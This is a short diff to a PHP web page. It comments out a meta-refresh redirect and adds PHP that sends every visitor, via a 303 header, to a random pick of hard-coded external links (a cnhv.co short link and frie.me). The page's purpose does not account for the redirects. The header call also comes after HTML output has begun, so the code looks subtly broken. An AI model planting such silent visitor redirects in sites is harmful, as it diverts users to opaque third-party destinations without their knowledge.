@@ -21,8 +21,24 @@
       });
     </script>
     
-    <!-- Redirect -->
-    <meta http-equiv="refresh" content="<?php rand(10,50);?>; URL=https://cnhv.co/3w5s6">
+    <!-- Redirect 
+    <meta http-equiv="refresh" content="10; URL=https://cnhv.co/3w5s6">
+    -->
+    
+    <?php
+    $addresses = [
+      'https://cnhv.co/3w5s6',
+      'https://cnhv.co/3w5s6',
+      'http://www.frie.me',
+      'http://www.frie.me',
+      'http://www.frie.me',
+    ];
+    $size = count($addresses);
+    $randomIndex = rand(0, $size - 1);
+    $randomUrl = $addresses[$randomIndex];
+    header('Location: ' . $randomUrl, true, 303);
+    ?>
+    
     
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
